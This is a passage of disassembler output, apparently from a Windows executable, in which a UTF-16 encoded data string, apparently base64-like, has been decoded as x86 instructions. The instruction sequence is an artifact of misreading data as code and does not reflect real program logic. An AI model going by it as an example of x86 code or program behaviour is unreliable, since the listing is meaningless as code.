  40af8b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af8e:	4e                   	dec    %esi
  40af8f:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
  40af93:	00 6d 00             	add    %ch,0x0(%ebp)
  40af96:	30 00                	xor    %al,(%eax)
  40af98:	6e                   	outsb  %ds:(%esi),(%dx)
  40af99:	00 4f 00             	add    %cl,0x0(%edi)
  40af9c:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40afa0:	75 00                	jne    0x40afa2
  40afa2:	74 00                	je     0x40afa4
  40afa4:	6d                   	insl   (%dx),%es:(%edi)
  40afa5:	00 71 00             	add    %dh,0x0(%ecx)
  40afa8:	50                   	push   %eax
  40afa9:	00 69 00             	add    %ch,0x0(%ecx)
  40afac:	4a                   	dec    %edx
  40afad:	00 4a 00             	add    %cl,0x0(%edx)
  40afb0:	73 00                	jae    0x40afb2
  40afb2:	46                   	inc    %esi
  40afb3:	00 61 00             	add    %ah,0x0(%ecx)
  40afb6:	49                   	dec    %ecx
  40afb7:	00 76 00             	add    %dh,0x0(%esi)
  40afba:	4e                   	dec    %esi
  40afbb:	00 36                	add    %dh,(%esi)
  40afbd:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  40afc1:	00 50 00             	add    %dl,0x0(%eax)
  40afc4:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40afc8:	58                   	pop    %eax
  40afc9:	00 4b 00             	add    %cl,0x0(%ebx)
  40afcc:	7a 00                	jp     0x40afce
  40afce:	58                   	pop    %eax
  40afcf:	00 71 00             	add    %dh,0x0(%ecx)
  40afd2:	78 00                	js     0x40afd4
  40afd4:	6d                   	insl   (%dx),%es:(%edi)
  40afd5:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  40afd9:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  40afdd:	00 6b 00             	add    %ch,0x0(%ebx)
  40afe0:	59                   	pop    %ecx
  40afe1:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  40afe5:	00 33                	add    %dh,(%ebx)
  40afe7:	00 47 00             	add    %al,0x0(%edi)
  40afea:	4f                   	dec    %edi
  40afeb:	00 73 00             	add    %dh,0x0(%ebx)
  40afee:	56                   	push   %esi
  40afef:	00 78 00             	add    %bh,0x0(%eax)
  40aff2:	4e                   	dec    %esi
  40aff3:	00 51 00             	add    %dl,0x0(%ecx)
  40aff6:	66 00 4c 00 42       	data16 add %cl,0x42(%eax,%eax,1)
  40affb:	00 35 00 32 00 68    	add    %dh,0x68003200
  40b001:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  40b005:	00 48 00             	add    %cl,0x0(%eax)
  40b008:	2f                   	das
  40b009:	00 42 00             	add    %al,0x0(%edx)
  40b00c:	48                   	dec    %eax
  40b00d:	00 56 00             	add    %dl,0x0(%esi)
  40b010:	7a 00                	jp     0x40b012
  40b012:	52                   	push   %edx
  40b013:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40b017:	00 56 00             	add    %dl,0x0(%esi)
  40b01a:	75 00                	jne    0x40b01c
  40b01c:	2b 00                	sub    (%eax),%eax
  40b01e:	42                   	inc    %edx
  40b01f:	00 65 00             	add    %ah,0x0(%ebp)
  40b022:	46                   	inc    %esi
  40b023:	00 31                	add    %dh,(%ecx)
  40b025:	00 61 00             	add    %ah,0x0(%ecx)
  40b028:	5a                   	pop    %edx
  40b029:	00 61 00             	add    %ah,0x0(%ecx)
  40b02c:	68 00 62 00 69       	push   $0x69006200
  40b031:	00 48 00             	add    %cl,0x0(%eax)
  40b034:	2f                   	das
  40b035:	00 30                	add    %dh,(%eax)
  40b037:	00 55 00             	add    %dl,0x0(%ebp)
  40b03a:	66 00 2b             	data16 add %ch,(%ebx)
  40b03d:	00 6e 00             	add    %ch,0x0(%esi)
  40b040:	52                   	push   %edx
  40b041:	00 6f 00             	add    %ch,0x0(%edi)
  40b044:	54                   	push   %esp
  40b045:	00 57 00             	add    %dl,0x0(%edi)
  40b048:	34 00                	xor    $0x0,%al
  40b04a:	72 00                	jb     0x40b04c
  40b04c:	46                   	inc    %esi
  40b04d:	00 4a 00             	add    %cl,0x0(%edx)
  40b050:	7a 00                	jp     0x40b052
  40b052:	74 00                	je     0x40b054
  40b054:	66 00 47 00          	data16 add %al,0x0(%edi)
  40b058:	62 00                	bound  %eax,(%eax)
  40b05a:	68 00 79 00 75       	push   $0x75007900
  40b05f:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40b063:	00 2b                	add    %ch,(%ebx)
  40b065:	00 7a 00             	add    %bh,0x0(%edx)
  40b068:	43                   	inc    %ebx
  40b069:	00 68 00             	add    %ch,0x0(%eax)
  40b06c:	43                   	inc    %ebx
  40b06d:	00 61 00             	add    %ah,0x0(%ecx)
  40b070:	30 00                	xor    %al,(%eax)
  40b072:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  40b076:	70 00                	jo     0x40b078
  40b078:	2f                   	das
  40b079:	00 47 00             	add    %al,0x0(%edi)
  40b07c:	45                   	inc    %ebp
  40b07d:	00 30                	add    %dh,(%eax)
  40b07f:	00 58 00             	add    %bl,0x0(%eax)
  40b082:	77 00                	ja     0x40b084
  40b084:	77 00                	ja     0x40b086
  40b086:	56                   	push   %esi
  40b087:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
  40b08b:	00 72 00             	add    %dh,0x0(%edx)
  40b08e:	6b 00 39             	imul   $0x39,(%eax),%eax
  40b091:	00 76 00             	add    %dh,0x0(%esi)
  40b094:	62 00                	bound  %eax,(%eax)
  40b096:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  40b099:	00 67 00             	add    %ah,0x0(%edi)
  40b09c:	45                   	inc    %ebp
  40b09d:	00 46 00             	add    %al,0x0(%esi)
  40b0a0:	78 00                	js     0x40b0a2
  40b0a2:	67 00 33             	add    %dh,(%bp,%di)
  40b0a5:	00 6a 00             	add    %ch,0x0(%edx)
  40b0a8:	61                   	popa
  40b0a9:	00 73 00             	add    %dh,0x0(%ebx)
  40b0ac:	52                   	push   %edx
  40b0ad:	00 6e 00             	add    %ch,0x0(%esi)
  40b0b0:	41                   	inc    %ecx
  40b0b1:	00 4f 00             	add    %cl,0x0(%edi)
  40b0b4:	79 00                	jns    0x40b0b6
  40b0b6:	41                   	inc    %ecx
  40b0b7:	00 30                	add    %dh,(%eax)
  40b0b9:	00 4c 00 46          	add    %cl,0x46(%eax,%eax,1)
  40b0bd:	00 6e 00             	add    %ch,0x0(%esi)
  40b0c0:	74 00                	je     0x40b0c2
  40b0c2:	5a                   	pop    %edx
  40b0c3:	00 57 00             	add    %dl,0x0(%edi)
  40b0c6:	51                   	push   %ecx
  40b0c7:	00 47 00             	add    %al,0x0(%edi)
  40b0ca:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40b0ce:	57                   	push   %edi
  40b0cf:	00 61 00             	add    %ah,0x0(%ecx)
  40b0d2:	6a 00                	push   $0x0
  40b0d4:	6b 00 71             	imul   $0x71,(%eax),%eax
  40b0d7:	00 2b                	add    %ch,(%ebx)
  40b0d9:	00 6f 00             	add    %ch,0x0(%edi)
  40b0dc:	33 00                	xor    (%eax),%eax
  40b0de:	46                   	inc    %esi
  40b0df:	00 51 00             	add    %dl,0x0(%ecx)
  40b0e2:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0e3:	00 69 00             	add    %ch,0x0(%ecx)
  40b0e6:	56                   	push   %esi
  40b0e7:	00 55 00             	add    %dl,0x0(%ebp)
  40b0ea:	47                   	inc    %edi
  40b0eb:	00 6a 00             	add    %ch,0x0(%edx)
  40b0ee:	43                   	inc    %ebx
  40b0ef:	00 64 00 59          	add    %ah,0x59(%eax,%eax,1)
  40b0f3:	00 43 00             	add    %al,0x0(%ebx)
  40b0f6:	43                   	inc    %ebx
  40b0f7:	00 4f 00             	add    %cl,0x0(%edi)
  40b0fa:	73 00                	jae    0x40b0fc
  40b0fc:	31 00                	xor    %eax,(%eax)
  40b0fe:	72 00                	jb     0x40b100
  40b100:	77 00                	ja     0x40b102
  40b102:	4b                   	dec    %ebx
  40b103:	00 6f 00             	add    %ch,0x0(%edi)
  40b106:	7a 00                	jp     0x40b108
  40b108:	48                   	dec    %eax
  40b109:	00 56 00             	add    %dl,0x0(%esi)
  40b10c:	6c                   	insb   (%dx),%es:(%edi)
  40b10d:	00 39                	add    %bh,(%ecx)
  40b10f:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40b113:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40b117:	00 4f 00             	add    %cl,0x0(%edi)
  40b11a:	74 00                	je     0x40b11c
  40b11c:	39 00                	cmp    %eax,(%eax)
  40b11e:	58                   	pop    %eax
  40b11f:	00 50 00             	add    %dl,0x0(%eax)
  40b122:	6c                   	insb   (%dx),%es:(%edi)
  40b123:	00 35 00 71 00 48    	add    %dh,0x48007100
  40b129:	00 43 00             	add    %al,0x0(%ebx)
  40b12c:	4a                   	dec    %edx
  40b12d:	00 59 00             	add    %bl,0x0(%ecx)
  40b130:	41                   	inc    %ecx
  40b131:	00 39                	add    %bh,(%ecx)
  40b133:	00 38                	add    %bh,(%eax)
  40b135:	00 42 00             	add    %al,0x0(%edx)
  40b138:	72 00                	jb     0x40b13a
  40b13a:	4c                   	dec    %esp
  40b13b:	00 52 00             	add    %dl,0x0(%edx)
  40b13e:	2b 00                	sub    (%eax),%eax
  40b140:	54                   	push   %esp
  40b141:	00 75 00             	add    %dh,0x0(%ebp)
  40b144:	57                   	push   %edi
  40b145:	00 4b 00             	add    %cl,0x0(%ebx)
  40b148:	32 00                	xor    (%eax),%al
  40b14a:	4e                   	dec    %esi
  40b14b:	00 7a 00             	add    %bh,0x0(%edx)
  40b14e:	67 00 6c 00          	add    %ch,0x0(%si)
  40b152:	36 00 57 00          	add    %dl,%ss:0x0(%edi)
  40b156:	2f                   	das
  40b157:	00 61 00             	add    %ah,0x0(%ecx)
  40b15a:	7a 00                	jp     0x40b15c
  40b15c:	49                   	dec    %ecx
  40b15d:	00 4b 00             	add    %cl,0x0(%ebx)
  40b160:	79 00                	jns    0x40b162
  40b162:	32 00                	xor    (%eax),%al
  40b164:	68 00 6f 00 6e       	push   $0x6e006f00
  40b169:	00 43 00             	add    %al,0x0(%ebx)
  40b16c:	59                   	pop    %ecx
  40b16d:	00 33                	add    %dh,(%ebx)
  40b16f:	00 6a 00             	add    %ch,0x0(%edx)
  40b172:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  40b176:	4d                   	dec    %ebp
  40b177:	00 43 00             	add    %al,0x0(%ebx)
  40b17a:	5a                   	pop    %edx
  40b17b:	00 35 00 42 00 72    	add    %dh,0x72004200
  40b181:	00 72 00             	add    %dh,0x0(%edx)
  40b184:	33 00                	xor    (%eax),%eax
  40b186:	6d                   	insl   (%dx),%es:(%edi)
  40b187:	00 6d 00             	add    %ch,0x0(%ebp)
  40b18a:	52                   	push   %edx
  40b18b:	00 45 00             	add    %al,0x0(%ebp)
  40b18e:	79 00                	jns    0x40b190
  40b190:	36 00 38             	add    %bh,%ss:(%eax)
  40b193:	00 49 00             	add    %cl,0x0(%ecx)
  40b196:	53                   	push   %ebx
  40b197:	00 47 00             	add    %al,0x0(%edi)
  40b19a:	52                   	push   %edx
  40b19b:	00 58 00             	add    %bl,0x0(%eax)
  40b19e:	76 00                	jbe    0x40b1a0
  40b1a0:	2f                   	das
  40b1a1:	00 79 00             	add    %bh,0x0(%ecx)
  40b1a4:	2b 00                	sub    (%eax),%eax
  40b1a6:	45                   	inc    %ebp
  40b1a7:	00 39                	add    %bh,(%ecx)
  40b1a9:	00 48 00             	add    %cl,0x0(%eax)
  40b1ac:	2b 00                	sub    (%eax),%eax
  40b1ae:	38 00                	cmp    %al,(%eax)
  40b1b0:	61                   	popa
  40b1b1:	00 47 00             	add    %al,0x0(%edi)
  40b1b4:	68 00 36 00 51       	push   $0x51003600
  40b1b9:	00 76 00             	add    %dh,0x0(%esi)
  40b1bc:	7a 00                	jp     0x40b1be
  40b1be:	50                   	push   %eax
  40b1bf:	00 50 00             	add    %dl,0x0(%eax)
  40b1c2:	63 00                	arpl   %eax,(%eax)
  40b1c4:	33 00                	xor    (%eax),%eax
  40b1c6:	6a 00                	push   $0x0
  40b1c8:	30 00                	xor    %al,(%eax)
  40b1ca:	2f                   	das
  40b1cb:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1ce:	72 00                	jb     0x40b1d0
  40b1d0:	6c                   	insb   (%dx),%es:(%edi)
  40b1d1:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40b1d5:	00 61 00             	add    %ah,0x0(%ecx)
  40b1d8:	39 00                	cmp    %eax,(%eax)
  40b1da:	38 00                	cmp    %al,(%eax)
  40b1dc:	50                   	push   %eax
  40b1dd:	00 30                	add    %dh,(%eax)
  40b1df:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40b1e3:	00 72 00             	add    %dh,0x0(%edx)
  40b1e6:	33 00                	xor    (%eax),%eax
  40b1e8:	32 00                	xor    (%eax),%al
  40b1ea:	33 00                	xor    (%eax),%eax
  40b1ec:	2b 00                	sub    (%eax),%eax
  40b1ee:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1ef:	00 41 00             	add    %al,0x0(%ecx)
  40b1f2:	4a                   	dec    %edx
  40b1f3:	00 30                	add    %dh,(%eax)
  40b1f5:	00 4d 00             	add    %cl,0x0(%ebp)
  40b1f8:	55                   	push   %ebp
  40b1f9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b1fc:	63 00                	arpl   %eax,(%eax)
  40b1fe:	55                   	push   %ebp
  40b1ff:	00 7a 00             	add    %bh,0x0(%edx)
  40b202:	2f                   	das
  40b203:	00 57 00             	add    %dl,0x0(%edi)
  40b206:	66 00 36             	data16 add %dh,(%esi)
  40b209:	00 61 00             	add    %ah,0x0(%ecx)
  40b20c:	63 00                	arpl   %eax,(%eax)
  40b20e:	35 00 79 00 72       	xor    $0x72007900,%eax
  40b213:	00 57 00             	add    %dl,0x0(%edi)
  40b216:	53                   	push   %ebx
  40b217:	00 63 00             	add    %ah,0x0(%ebx)
  40b21a:	70 00                	jo     0x40b21c
  40b21c:	32 00                	xor    (%eax),%al
  40b21e:	7a 00                	jp     0x40b220
  40b220:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40b224:	51                   	push   %ecx
  40b225:	00 42 00             	add    %al,0x0(%edx)
  40b228:	4b                   	dec    %ebx
  40b229:	00 7a 00             	add    %bh,0x0(%edx)
  40b22c:	43                   	inc    %ebx
  40b22d:	00 6e 00             	add    %ch,0x0(%esi)
  40b230:	55                   	push   %ebp
  40b231:	00 37                	add    %dh,(%edi)
  40b233:	00 4b 00             	add    %cl,0x0(%ebx)
  40b236:	4b                   	dec    %ebx
  40b237:	00 32                	add    %dh,(%edx)
  40b239:	00 4a 00             	add    %cl,0x0(%edx)
  40b23c:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  40b240:	68 00 34 00 4b       	push   $0x4b003400
  40b245:	00 6b 00             	add    %ch,0x0(%ebx)
  40b248:	32 00                	xor    (%eax),%al
  40b24a:	38 00                	cmp    %al,(%eax)
  40b24c:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  40b250:	32 00                	xor    (%eax),%al
  40b252:	4d                   	dec    %ebp
  40b253:	00 2f                	add    %ch,(%edi)
  40b255:	00 46 00             	add    %al,0x0(%esi)
  40b258:	47                   	inc    %edi
  40b259:	00 30                	add    %dh,(%eax)
  40b25b:	00 63 00             	add    %ah,0x0(%ebx)
  40b25e:	53                   	push   %ebx
  40b25f:	00 46 00             	add    %al,0x0(%esi)
  40b262:	73 00                	jae    0x40b264
  40b264:	58                   	pop    %eax
  40b265:	00 75 00             	add    %dh,0x0(%ebp)
  40b268:	57                   	push   %edi
  40b269:	00 63 00             	add    %ah,0x0(%ebx)
  40b26c:	62 00                	bound  %eax,(%eax)
  40b26e:	7a 00                	jp     0x40b270
  40b270:	73 00                	jae    0x40b272
  40b272:	39 00                	cmp    %eax,(%eax)
  40b274:	4c                   	dec    %esp
  40b275:	00 59 00             	add    %bl,0x0(%ecx)
  40b278:	37                   	aaa
  40b279:	00 58 00             	add    %bl,0x0(%eax)
  40b27c:	74 00                	je     0x40b27e
  40b27e:	77 00                	ja     0x40b280
  40b280:	71 00                	jno    0x40b282
  40b282:	36 00 52 00          	add    %dl,%ss:0x0(%edx)
  40b286:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  40b28a:	63 00                	arpl   %eax,(%eax)
  40b28c:	65 00 6c 00 43       	add    %ch,%gs:0x43(%eax,%eax,1)
  40b291:	00 53 00             	add    %dl,0x0(%ebx)
  40b294:	42                   	inc    %edx
  40b295:	00 31                	add    %dh,(%ecx)
  40b297:	00 38                	add    %bh,(%eax)
  40b299:	00 64 00 71          	add    %ah,0x71(%eax,%eax,1)
  40b29d:	00 75 00             	add    %dh,0x0(%ebp)
  40b2a0:	70 00                	jo     0x40b2a2
  40b2a2:	4c                   	dec    %esp
  40b2a3:	00 51 00             	add    %dl,0x0(%ecx)
  40b2a6:	4e                   	dec    %esi
  40b2a7:	00 62 00             	add    %ah,0x0(%edx)
  40b2aa:	35 00 49 00 47       	xor    $0x47004900,%eax
  40b2af:	00 73 00             	add    %dh,0x0(%ebx)
  40b2b2:	50                   	push   %eax
  40b2b3:	00 78 00             	add    %bh,0x0(%eax)
  40b2b6:	34 00                	xor    $0x0,%al
  40b2b8:	2b 00                	sub    (%eax),%eax
  40b2ba:	55                   	push   %ebp
  40b2bb:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40b2bf:	00 76 00             	add    %dh,0x0(%esi)
  40b2c2:	7a 00                	jp     0x40b2c4
  40b2c4:	4b                   	dec    %ebx
  40b2c5:	00 67 00             	add    %ah,0x0(%edi)
  40b2c8:	37                   	aaa
  40b2c9:	00 72 00             	add    %dh,0x0(%edx)
  40b2cc:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2cd:	00 45 00             	add    %al,0x0(%ebp)
  40b2d0:	51                   	push   %ecx
  40b2d1:	00 71 00             	add    %dh,0x0(%ecx)
  40b2d4:	4a                   	dec    %edx
  40b2d5:	00 51 00             	add    %dl,0x0(%ecx)
  40b2d8:	76 00                	jbe    0x40b2da
  40b2da:	37                   	aaa
  40b2db:	00 79 00             	add    %bh,0x0(%ecx)
  40b2de:	30 00                	xor    %al,(%eax)
  40b2e0:	79 00                	jns    0x40b2e2
  40b2e2:	73 00                	jae    0x40b2e4
  40b2e4:	32 00                	xor    (%eax),%al
  40b2e6:	4a                   	dec    %edx
  40b2e7:	00 78 00             	add    %bh,0x0(%eax)
  40b2ea:	32 00                	xor    (%eax),%al
  40b2ec:	66 00 58 00          	data16 add %bl,0x0(%eax)
  40b2f0:	4b                   	dec    %ebx
  40b2f1:	00 38                	add    %bh,(%eax)
  40b2f3:	00 35 00 4a 00 46    	add    %dh,0x46004a00
  40b2f9:	00 2b                	add    %ch,(%ebx)
  40b2fb:	00 35 00 47 00 4b    	add    %dh,0x4b004700
  40b301:	00 75 00             	add    %dh,0x0(%ebp)
  40b304:	6b 00 76             	imul   $0x76,(%eax),%eax
  40b307:	00 36                	add    %dh,(%esi)
  40b309:	00 68 00             	add    %ch,0x0(%eax)
  40b30c:	42                   	inc    %edx
  40b30d:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40b311:	00 6e 00             	add    %ch,0x0(%esi)
  40b314:	33 00                	xor    (%eax),%eax
  40b316:	43                   	inc    %ebx
  40b317:	00 51 00             	add    %dl,0x0(%ecx)
  40b31a:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40b31d:	00 35 00 39 00 77    	add    %dh,0x77003900
  40b323:	00 5a 00             	add    %bl,0x0(%edx)
  40b326:	71 00                	jno    0x40b328
  40b328:	68 00 59 00 38       	push   $0x38005900
  40b32d:	00 33                	add    %dh,(%ebx)
  40b32f:	00 6d 00             	add    %ch,0x0(%ebp)
  40b332:	4f                   	dec    %edi
  40b333:	00 68 00             	add    %ch,0x0(%eax)
  40b336:	6d                   	insl   (%dx),%es:(%edi)
  40b337:	00 39                	add    %bh,(%ecx)
  40b339:	00 73 00             	add    %dh,0x0(%ebx)
  40b33c:	62 00                	bound  %eax,(%eax)
  40b33e:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b342:	30 00                	xor    %al,(%eax)
  40b344:	32 00                	xor    (%eax),%al
  40b346:	4c                   	dec    %esp
  40b347:	00 76 00             	add    %dh,0x0(%esi)
  40b34a:	53                   	push   %ebx
  40b34b:	00 48 00             	add    %cl,0x0(%eax)
  40b34e:	31 00                	xor    %eax,(%eax)
  40b350:	74 00                	je     0x40b352
  40b352:	51                   	push   %ecx
  40b353:	00 68 00             	add    %ch,0x0(%eax)
  40b356:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  40b35a:	69 00 35 00 47 00    	imul   $0x470035,(%eax),%eax
  40b360:	4e                   	dec    %esi
  40b361:	00 53 00             	add    %dl,0x0(%ebx)
  40b364:	57                   	push   %edi
  40b365:	00 6d 00             	add    %ch,0x0(%ebp)
  40b368:	30 00                	xor    %al,(%eax)
  40b36a:	59                   	pop    %ecx
  40b36b:	00 4f 00             	add    %cl,0x0(%edi)
  40b36e:	72 00                	jb     0x40b370
  40b370:	32 00                	xor    (%eax),%al
  40b372:	50                   	push   %eax
  40b373:	00 6e 00             	add    %ch,0x0(%esi)
  40b376:	70 00                	jo     0x40b378
  40b378:	35 00 63 00 70       	xor    $0x70006300,%eax
  40b37d:	00 41 00             	add    %al,0x0(%ecx)
  40b380:	73 00                	jae    0x40b382
  40b382:	56                   	push   %esi
  40b383:	00 53 00             	add    %dl,0x0(%ebx)
  40b386:	38 00                	cmp    %al,(%eax)
  40b388:	74 00                	je     0x40b38a
  40b38a:	61                   	popa
  40b38b:	00 62 00             	add    %ah,0x0(%edx)
  40b38e:	55                   	push   %ebp
  40b38f:	00 41 00             	add    %al,0x0(%ecx)
  40b392:	78 00                	js     0x40b394
  40b394:	39 00                	cmp    %eax,(%eax)
  40b396:	41                   	inc    %ecx
  40b397:	00 63 00             	add    %ah,0x0(%ebx)
  40b39a:	33 00                	xor    (%eax),%eax
  40b39c:	41                   	inc    %ecx
  40b39d:	00 31                	add    %dh,(%ecx)
  40b39f:	00 51 00             	add    %dl,0x0(%ecx)
  40b3a2:	67 00 76 00          	add    %dh,0x0(%bp)
  40b3a6:	57                   	push   %edi
  40b3a7:	00 59 00             	add    %bl,0x0(%ecx)
  40b3aa:	52                   	push   %edx
  40b3ab:	00 64 00 70          	add    %ah,0x70(%eax,%eax,1)
  40b3af:	00 51 00             	add    %dl,0x0(%ecx)
  40b3b2:	44                   	inc    %esp
  40b3b3:	00 39                	add    %bh,(%ecx)
  40b3b5:	00 30                	add    %dh,(%eax)
  40b3b7:	00 39                	add    %bh,(%ecx)
  40b3b9:	00 69 00             	add    %ch,0x0(%ecx)
  40b3bc:	4a                   	dec    %edx
  40b3bd:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40b3c1:	00 43 00             	add    %al,0x0(%ebx)
  40b3c4:	55                   	push   %ebp
  40b3c5:	00 4e 00             	add    %cl,0x0(%esi)
  40b3c8:	57                   	push   %edi
  40b3c9:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
  40b3cd:	00 6e 00             	add    %ch,0x0(%esi)
  40b3d0:	31 00                	xor    %eax,(%eax)
  40b3d2:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40b3d6:	50                   	push   %eax
  40b3d7:	00 4d 00             	add    %cl,0x0(%ebp)
  40b3da:	46                   	inc    %esi
  40b3db:	00 31                	add    %dh,(%ecx)
  40b3dd:	00 35 00 59 00 44    	add    %dh,0x44005900
  40b3e3:	00 7a 00             	add    %bh,0x0(%edx)
  40b3e6:	39 00                	cmp    %eax,(%eax)
  40b3e8:	4a                   	dec    %edx
  40b3e9:	00 4d 00             	add    %cl,0x0(%ebp)
  40b3ec:	33 00                	xor    (%eax),%eax
  40b3ee:	77 00                	ja     0x40b3f0
  40b3f0:	52                   	push   %edx
  40b3f1:	00 33                	add    %dh,(%ebx)
  40b3f3:	00 7a 00             	add    %bh,0x0(%edx)
  40b3f6:	4b                   	dec    %ebx
  40b3f7:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b3fb:	00 35 00 36 00 4b    	add    %dh,0x4b003600
  40b401:	00 56 00             	add    %dl,0x0(%esi)
  40b404:	54                   	push   %esp
  40b405:	00 6f 00             	add    %ch,0x0(%edi)
  40b408:	45                   	inc    %ebp
  40b409:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b40d:	00 68 00             	add    %ch,0x0(%eax)
  40b410:	6f                   	outsl  %ds:(%esi),(%dx)
  40b411:	00 46 00             	add    %al,0x0(%esi)
  40b414:	4c                   	dec    %esp
  40b415:	00 62 00             	add    %ah,0x0(%edx)
  40b418:	5a                   	pop    %edx
  40b419:	00 72 00             	add    %dh,0x0(%edx)
  40b41c:	35 00 7a 00 32       	xor    $0x32007a00,%eax
  40b421:	00 53 00             	add    %dl,0x0(%ebx)
  40b424:	61                   	popa
  40b425:	00 31                	add    %dh,(%ecx)
  40b427:	00 47 00             	add    %al,0x0(%edi)
  40b42a:	6f                   	outsl  %ds:(%esi),(%dx)
  40b42b:	00 7a 00             	add    %bh,0x0(%edx)
  40b42e:	74 00                	je     0x40b430
  40b430:	30 00                	xor    %al,(%eax)
  40b432:	73 00                	jae    0x40b434
  40b434:	41                   	inc    %ecx
  40b435:	00 65 00             	add    %ah,0x0(%ebp)
  40b438:	51                   	push   %ecx
  40b439:	00 79 00             	add    %bh,0x0(%ecx)
  40b43c:	6d                   	insl   (%dx),%es:(%edi)
  40b43d:	00 33                	add    %dh,(%ebx)
  40b43f:	00 63 00             	add    %ah,0x0(%ebx)
  40b442:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40b446:	74 00                	je     0x40b448
  40b448:	30 00                	xor    %al,(%eax)
  40b44a:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b44e:	78 00                	js     0x40b450
  40b450:	6a 00                	push   $0x0
  40b452:	47                   	inc    %edi
  40b453:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
  40b457:	00 32                	add    %dh,(%edx)
  40b459:	00 4f 00             	add    %cl,0x0(%edi)
  40b45c:	76 00                	jbe    0x40b45e
  40b45e:	77 00                	ja     0x40b460
  40b460:	4a                   	dec    %edx
  40b461:	00 78 00             	add    %bh,0x0(%eax)
  40b464:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  40b468:	6c                   	insb   (%dx),%es:(%edi)
  40b469:	00 39                	add    %bh,(%ecx)
  40b46b:	00 71 00             	add    %dh,0x0(%ecx)
  40b46e:	49                   	dec    %ecx
  40b46f:	00 43 00             	add    %al,0x0(%ebx)
  40b472:	62 00                	bound  %eax,(%eax)
  40b474:	38 00                	cmp    %al,(%eax)
  40b476:	50                   	push   %eax
  40b477:	00 4b 00             	add    %cl,0x0(%ebx)
  40b47a:	47                   	inc    %edi
  40b47b:	00 45 00             	add    %al,0x0(%ebp)
  40b47e:	66 00 44 00 4e       	data16 add %al,0x4e(%eax,%eax,1)
  40b483:	00 79 00             	add    %bh,0x0(%ecx)
  40b486:	63 00                	arpl   %eax,(%eax)
  40b488:	2f                   	das
  40b489:	00 38                	add    %bh,(%eax)
  40b48b:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  40b48f:	00 6e 00             	add    %ch,0x0(%esi)
  40b492:	34 00                	xor    $0x0,%al
  40b494:	41                   	inc    %ecx
  40b495:	00 67 00             	add    %ah,0x0(%edi)
  40b498:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  40b49c:	2f                   	das
  40b49d:	00 30                	add    %dh,(%eax)
  40b49f:	00 37                	add    %dh,(%edi)
  40b4a1:	00 6e 00             	add    %ch,0x0(%esi)
  40b4a4:	38 00                	cmp    %al,(%eax)
  40b4a6:	76 00                	jbe    0x40b4a8
  40b4a8:	38 00                	cmp    %al,(%eax)
  40b4aa:	48                   	dec    %eax
  40b4ab:	00 2f                	add    %ch,(%edi)
  40b4ad:	00 56 00             	add    %dl,0x0(%esi)
  40b4b0:	7a 00                	jp     0x40b4b2
  40b4b2:	51                   	push   %ecx
  40b4b3:	00 58 00             	add    %bl,0x0(%eax)
  40b4b6:	2f                   	das
  40b4b7:	00 33                	add    %dh,(%ebx)
  40b4b9:	00 75 00             	add    %dh,0x0(%ebp)
  40b4bc:	45                   	inc    %ebp
  40b4bd:	00 33                	add    %dh,(%ebx)
  40b4bf:	00 74 00 30          	add    %dh,0x30(%eax,%eax,1)
  40b4c3:	00 58 00             	add    %bl,0x0(%eax)
  40b4c6:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  40b4ca:	44                   	inc    %esp
  40b4cb:	00 63 00             	add    %ah,0x0(%ebx)
  40b4ce:	33 00                	xor    (%eax),%eax
  40b4d0:	33 00                	xor    (%eax),%eax
  40b4d2:	69 00 37 00 42 00    	imul   $0x420037,(%eax),%eax
  40b4d8:	49                   	dec    %ecx
  40b4d9:	00 39                	add    %bh,(%ecx)
  40b4db:	00 4c 00 63          	add    %cl,0x63(%eax,%eax,1)
  40b4df:	00 58 00             	add    %bl,0x0(%eax)
  40b4e2:	46                   	inc    %esi
  40b4e3:	00 4d 00             	add    %cl,0x0(%ebp)
  40b4e6:	37                   	aaa
  40b4e7:	00 45 00             	add    %al,0x0(%ebp)
  40b4ea:	63 00                	arpl   %eax,(%eax)
  40b4ec:	4f                   	dec    %edi
